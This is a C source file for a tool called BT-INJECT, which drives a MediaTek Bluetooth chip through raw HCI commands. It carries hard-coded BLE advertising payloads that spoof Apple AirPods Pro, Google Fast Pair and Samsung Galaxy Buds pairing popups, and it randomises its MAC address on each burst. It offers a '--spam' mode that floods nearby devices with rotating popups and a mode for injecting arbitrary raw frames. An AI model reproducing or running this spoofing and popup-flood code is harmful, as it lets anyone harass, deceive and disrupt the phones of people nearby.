#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <stdint.h>
#include <time.h>

#define BT_DEV "/dev/stpbt"

static volatile int g_running = 1;
static void sig_handler(int sig) {
    (void)sig;
    g_running = 0;
}

static int send_hci_cmd(int fd, const uint8_t *cmd, size_t len, uint8_t *resp, size_t resp_max) {
    ssize_t written = write(fd, cmd, len);
    if (written < 0) return -1;

    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(fd, &fds);
    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };

    int ret = select(fd + 1, &fds, NULL, NULL, &tv);
    if (ret <= 0) return -1;

    ssize_t n = read(fd, resp, resp_max);
    return (int)n;
}

// Pre-crafted BLE Advertising Payloads
// 1. Apple AirDrop / iOS Proximity Popup (AirPods Pro setup popup)
static const uint8_t APPLE_AIRPODS_PRO[] = {
    0x1E, // Length = 30 bytes
    0xFF, // AD Type: Manufacturer Specific
    0x4C, 0x00, // Apple Inc. (0x004C)
    0x07, 0x19, // Type: Proximity Pairing, Len: 25
    0x01,       // Prefix
    0x0E, 0x20, // Model: AirPods Pro (0x0E20)
    0x55,       // Status flags
    0x55,       // Battery levels (left/right/case)
    0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// 2. Google Fast Pair Notification
static const uint8_t GOOGLE_FAST_PAIR[] = {
    0x06, // Length = 6 bytes
    0x16, // AD Type: Service Data - 16-bit UUID
    0x2C, 0xFE, // Fast Pair UUID (0xFE2C)
    0xCD, 0x82, 0x54 // Model ID (e.g. Pixel Buds Pro / Google Device)
};

// 3. Samsung Galaxy Buds Popup
static const uint8_t SAMSUNG_BUDS[] = {
    0x18, // Length = 24 bytes
    0xFF, // AD Type: Manufacturer Specific
    0x75, 0x00, // Samsung Electronics (0x0075)
    0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
    0x2E, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// 4. Custom iBeacon (UUID: E2C56DB5-DFFB-48D2-B060-D0F5A71096E0, Major: 1, Minor: 1)
static const uint8_t IBEACON_PAYLOAD[] = {
    0x1A, // Length = 26 bytes
    0xFF, // Manufacturer Specific
    0x4C, 0x00, // Apple Inc
    0x02, 0x15, // iBeacon Type (0x02) & Sub-len (0x15 = 21 bytes)
    0xE2, 0xC5, 0x6D, 0xB5, 0xDF, 0xFB, 0x48, 0xD2, // UUID part 1
    0xB0, 0x60, 0xD0, 0xF5, 0xA7, 0x10, 0x96, 0xE0, // UUID part 2
    0x00, 0x01, // Major (1)
    0x00, 0x01, // Minor (1)
    0xC5        // Measured Power (-59 dBm)
};

static void print_banner(void) {
    printf("\033[1;35m==============================================================\033[0m\n");
    printf("\033[1;37m        BT-INJECT: MediaTek Bluetooth Packet Injector\033[0m\n");
    printf("\033[1;30m   Pure-Linux Hardware Baseband Injection Engine (/dev/stpbt)\033[0m\n");
    printf("\033[1;35m==============================================================\033[0m\n");
}

static void show_help(const char *prog) {
    print_banner();
    printf("Usage: %s [mode] [options]\n\n", prog);
    printf("Modes:\n");
    printf("  --airpods         Broadcast Apple AirPods Pro pairing prompt\n");
    printf("  --fastpair        Broadcast Google Fast Pair device announcement\n");
    printf("  --samsung         Broadcast Samsung Galaxy Buds pairing notification\n");
    printf("  --ibeacon         Broadcast standard Apple iBeacon advertisement\n");
    printf("  --custom <hex>    Inject arbitrary raw HCI command frame in hex\n");
    printf("  --spam            Continuous rotating multi-vector BLE popup flood\n\n");
    printf("Options:\n");
    printf("  -i, --interval    Beacon transmission interval in ms (default: 50)\n");
    printf("  -d, --duration    Duration in seconds (default: 10, 0 = infinite)\n");
    printf("  -h, --help        Show this help message\n\n");
}

static void set_random_mac(int fd, uint8_t *resp) {
    // HCI_LE_Set_Random_Address: OpCode 0x2005 (OGF 0x08, OCF 0x0005)
    uint8_t cmd_mac[10];
    cmd_mac[0] = 0x01;
    cmd_mac[1] = 0x05;
    cmd_mac[2] = 0x20;
    cmd_mac[3] = 0x06;
    for (int i = 0; i < 6; i++) {
        cmd_mac[4 + i] = (uint8_t)(rand() & 0xFF);
    }
    cmd_mac[9] |= 0xC0; // Static random address top 2 bits must be 11
    send_hci_cmd(fd, cmd_mac, sizeof(cmd_mac), resp, 64);
}

static void inject_adv_data(int fd, const uint8_t *ad, size_t ad_len, uint8_t *resp) {
    // 1. LE_Set_Advertising_Parameters: OpCode 0x2006 (interval=32 = 20ms, non-connectable/connectable undirected)
    uint8_t cmd_param[] = {
        0x01, 0x06, 0x20, 0x0F,
        0x20, 0x00, // Min Interval: 0x0020 (20ms)
        0x30, 0x00, // Max Interval: 0x0030 (30ms)
        0x00,       // Adv Type: Connectable undirected (ADV_IND)
        0x01,       // Own Addr Type: Random Device Address
        0x00,       // Peer Addr Type: Public
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Peer Addr
        0x07,       // Adv Channel Map: 37, 38, 39 (all 3 channels)
        0x00        // Filter Policy: Allow any
    };
    send_hci_cmd(fd, cmd_param, sizeof(cmd_param), resp, 64);

    // 2. LE_Set_Advertising_Data: OpCode 0x2008 (len=32: [len, data...])
    uint8_t cmd_data[36] = {0};
    cmd_data[0] = 0x01;
    cmd_data[1] = 0x08;
    cmd_data[2] = 0x20;
    cmd_data[3] = 0x20; // 32 bytes parameter length
    cmd_data[4] = (uint8_t)ad_len;
    if (ad_len > 31) ad_len = 31;
    memcpy(&cmd_data[5], ad, ad_len);
    send_hci_cmd(fd, cmd_data, sizeof(cmd_data), resp, 64);

    // 3. LE_Set_Advertise_Enable: OpCode 0x200A
    uint8_t cmd_enable[] = { 0x01, 0x0a, 0x20, 0x01, 0x01 };
    send_hci_cmd(fd, cmd_enable, sizeof(cmd_enable), resp, 64);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        show_help(argv[0]);
        return 1;
    }

    int mode = 0; // 1=airpods, 2=fastpair, 3=samsung, 4=ibeacon, 5=custom, 6=spam
    int interval_ms = 50;
    int duration_sec = 10;
    const char *custom_hex = NULL;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--airpods")) mode = 1;
        else if (!strcmp(argv[i], "--fastpair")) mode = 2;
        else if (!strcmp(argv[i], "--samsung")) mode = 3;
        else if (!strcmp(argv[i], "--ibeacon")) mode = 4;
        else if (!strcmp(argv[i], "--spam")) mode = 6;
        else if (!strcmp(argv[i], "--custom") && i + 1 < argc) { mode = 5; custom_hex = argv[++i]; }
        else if (!strcmp(argv[i], "-i") && i + 1 < argc) interval_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-d") && i + 1 < argc) duration_sec = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) { show_help(argv[0]); return 0; }
    }

    if (mode == 0) {
        show_help(argv[0]);
        return 1;
    }

    print_banner();
    printf("[*] Connecting to MT6631 Bluetooth Hardware Baseband (/dev/stpbt)...\n");
    int fd = open(BT_DEV, O_RDWR | O_NOCTTY);
    if (fd < 0) {
        fprintf(stderr, "[-] Failed to open %s: %s\n", BT_DEV, strerror(errno));
        return 1;
    }
    printf("\033[1;32m[+] Radio online (WMT power enabled).\033[0m\n");

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    srand(time(NULL));

    uint8_t rx_buf[128];
    uint8_t cmd_reset[] = { 0x01, 0x03, 0x0c, 0x00 };
    send_hci_cmd(fd, cmd_reset, sizeof(cmd_reset), rx_buf, sizeof(rx_buf));

    if (mode == 5) {
        // Custom Raw Hex Injection
        size_t hlen = strlen(custom_hex);
        if (hlen % 2 != 0) {
            fprintf(stderr, "[-] Hex string must have an even length!\n");
            close(fd);
            return 1;
        }
        size_t bin_len = hlen / 2;
        uint8_t *raw_pkt = malloc(bin_len);
        for (size_t i = 0; i < bin_len; i++) {
            sscanf(&custom_hex[i * 2], "%02hhx", &raw_pkt[i]);
        }
        printf("[*] Injecting %zu bytes raw HCI frame...\n", bin_len);
        int resp_len = send_hci_cmd(fd, raw_pkt, bin_len, rx_buf, sizeof(rx_buf));
        if (resp_len > 0) {
            printf("\033[1;32m[+] Controller Ack [%d bytes]:\033[0m ", resp_len);
            for (int i = 0; i < resp_len; i++) printf("%02X ", rx_buf[i]);
            printf("\n");
        }
        free(raw_pkt);
    } else {
        printf("[*] Starting Hardware BLE Beacon Ingestion Engine...\n");
        printf("[*] Burst Interval: %d ms | Duration: %d seconds\n\n", interval_ms, duration_sec);

        time_t start_time = time(NULL);
        uint64_t tx_bursts = 0;

        while (g_running) {
            if (duration_sec > 0 && (time(NULL) - start_time) >= duration_sec) break;

            set_random_mac(fd, rx_buf);

            switch (mode) {
                case 1:
                    inject_adv_data(fd, APPLE_AIRPODS_PRO, sizeof(APPLE_AIRPODS_PRO), rx_buf);
                    printf("\r\033[1;32m[TX #%llu]\033[0m Apple AirPods Pro Pairing Prompt Broadcasted ", (unsigned long long)++tx_bursts);
                    break;
                case 2:
                    inject_adv_data(fd, GOOGLE_FAST_PAIR, sizeof(GOOGLE_FAST_PAIR), rx_buf);
                    printf("\r\033[1;34m[TX #%llu]\033[0m Google Fast Pair Device Broadcasted ", (unsigned long long)++tx_bursts);
                    break;
                case 3:
                    inject_adv_data(fd, SAMSUNG_BUDS, sizeof(SAMSUNG_BUDS), rx_buf);
                    printf("\r\033[1;36m[TX #%llu]\033[0m Samsung Galaxy Buds Broadcasted ", (unsigned long long)++tx_bursts);
                    break;
                case 4:
                    inject_adv_data(fd, IBEACON_PAYLOAD, sizeof(IBEACON_PAYLOAD), rx_buf);
                    printf("\r\033[1;33m[TX #%llu]\033[0m Apple iBeacon Advertisement Broadcasted ", (unsigned long long)++tx_bursts);
                    break;
                case 6: {
                    int sub = (tx_bursts % 4) + 1;
                    if (sub == 1) inject_adv_data(fd, APPLE_AIRPODS_PRO, sizeof(APPLE_AIRPODS_PRO), rx_buf);
                    else if (sub == 2) inject_adv_data(fd, GOOGLE_FAST_PAIR, sizeof(GOOGLE_FAST_PAIR), rx_buf);
                    else if (sub == 3) inject_adv_data(fd, SAMSUNG_BUDS, sizeof(SAMSUNG_BUDS), rx_buf);
                    else inject_adv_data(fd, IBEACON_PAYLOAD, sizeof(IBEACON_PAYLOAD), rx_buf);
                    printf("\r\033[1;31m[MULTI-VECTOR #%llu]\033[0m Dispatched Rotating BLE Vector (%s) ", 
                        (unsigned long long)++tx_bursts, sub==1?"Apple":sub==2?"Google":sub==3?"Samsung":"iBeacon");
                    break;
                }
            }
            fflush(stdout);
            usleep(interval_ms * 1000);
        }
        printf("\n\n\033[1;32m[✓] Injection complete! Total bursts dispatched: %llu\033[0m\n", (unsigned long long)tx_bursts);
    }

    // Stop advertising & reset
    uint8_t cmd_disable[] = { 0x01, 0x0a, 0x20, 0x01, 0x00 };
    send_hci_cmd(fd, cmd_disable, sizeof(cmd_disable), rx_buf, sizeof(rx_buf));
    close(fd);
    printf("[*] Radio powered down cleanly.\n");
    return 0;
}
